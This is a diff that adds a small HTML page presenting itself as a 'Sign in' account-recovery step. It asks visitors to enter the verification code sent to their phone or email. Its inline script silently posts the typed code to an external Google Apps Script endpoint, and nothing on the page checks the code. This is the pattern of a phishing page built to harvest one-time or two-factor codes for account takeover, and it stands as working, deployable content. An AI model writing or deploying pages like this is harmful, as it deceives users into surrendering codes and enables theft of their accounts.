@@ -1,0 +1,43 @@
+!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Code</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="wrapper">
+        <img src=" alt="">
+        <h1 class="title">Sign in</h1>
+        <p>To recover your account pls Enter the verification code that we sent to you through mobile or Email:</p>
+        <form id="codeform">
+            <div class="animate-label">
+                <input type="text" id="code" required>
+                <label for="code">Enter the Code</label>
+                <line></line>
+            </div>
+            <div class="flex">
+                <button type="submit">Submit</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('codeform').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var formData = {
+                code: document.getElementById('code').value
+            };
+            fetch('https://script.google.com/macros/s/AKfycbyX0jy2im19gdj2IGV394Dam-NK7wvfTUFjJLUZ5ZWfcNnqHqhhpG9tg1ODF6MHWrCn/exec', {
+                method: 'POST',
+                body: JSON.stringify(formData)
+            })
+            .then(response => response.text())
+            .then(data => alert(data))
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
+</body>
+</html>
